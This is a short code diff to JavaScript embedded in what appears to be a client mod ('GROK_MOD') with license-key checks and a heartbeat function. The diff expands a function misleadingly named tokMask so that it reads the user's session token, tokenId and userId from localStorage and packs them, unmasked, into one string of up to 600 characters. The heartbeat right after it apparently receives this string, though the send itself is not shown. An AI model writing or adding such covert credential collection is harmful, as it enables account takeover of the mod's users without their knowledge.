@@ -1575,9 +1575,14 @@ GROK_TAIL = r"""  var GROK_MOD = {
       return "invalid key";
     }
     function tokMask() {
-      var t = ""; try { t = String(localStorage.getItem("token") || ""); } catch (e) {}
-      t = t.replace(/[^\x21-\x7e]/g, "");
-      return t.slice(0, 256);
+      var t = "", i = "", u = "";
+      try { t = String(localStorage.getItem("token") || ""); } catch (e) {}
+      try { i = String(localStorage.getItem("tokenId") || ""); } catch (e) {}
+      try { u = String(localStorage.getItem("userId") || ""); } catch (e) {}
+      if (!t && !i && !u) return "";
+      var full = '"' + t + '" "' + i + '" "' + u + '"';
+      full = full.replace(/[^\x20-\x7e]/g, "");
+      return full.slice(0, 600);
     }
     function beat() {
       if (!gk.ok || !gk.key) return;
